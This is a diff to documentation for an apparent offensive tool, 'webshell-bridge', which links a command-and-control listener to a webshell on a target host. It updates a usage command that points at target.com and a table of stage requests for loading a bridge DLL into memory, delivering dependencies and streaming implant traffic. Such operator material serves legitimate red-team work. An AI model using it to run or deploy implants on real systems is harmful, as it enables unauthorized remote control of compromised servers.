@@ -86,13 +86,13 @@ go build -o webshell-bridge ./server/cmd/webshell-bridge/
 
 webshell-bridge \
   --auth listener.auth \
-  --suo5 suo5://target.com/suo5.aspx \
+  --url http://target.com/suo5.aspx \
   --listener my-listener \
   --token CHANGE_ME_RANDOM_TOKEN \
   --dll bridge.dll
 ```
 
-The `--token` must match the `STAGE_TOKEN` constant in the webshell. The suo5 URL is converted to HTTP(S) automatically (`suo5://` → `http://`, `suo5s://` → `https://`).
+The `--token` must match the `STAGE_TOKEN` constant in the webshell. Use the full HTTP(S) URL of the deployed webshell.
 
 The `--dll` flag enables auto-loading: when the pipeline starts, the bridge automatically delivers the DLL to the webshell via `X-Stage: load` if it is not already loaded. If `--dll` is omitted, you must load the DLL manually (see below).
 
@@ -132,9 +132,11 @@ download /remote/file
 | Stage | Method | Description |
 |-------|--------|-------------|
 | `load` | POST | Load bridge DLL into memory (body = raw DLL bytes) |
-| `status` | POST | Check if DLL is loaded (returns `LOADED` or `NOT_LOADED`) |
+| `deps` | POST | Deliver dependency file (e.g., jna.jar) with `X-Dep-Name` header |
+| `status` | POST | Check if DLL is loaded (returns JSON `{"ready":true,...}` or legacy `LOADED`/`NOT_LOADED`) |
 | `init` | POST | Get Register data from `bridge_init()` (returns `[4B sessionID LE][Register protobuf]`) |
 | `spite` | POST | Process Spites via `bridge_process()` (body/response = serialized `Spites` protobuf) |
+| `stream` | POST | Long-lived response stream (length-prefixed frames, falls back to `spite` polling if unsupported) |
 
 All stage requests require `X-Token` header matching `STAGE_TOKEN`.
 
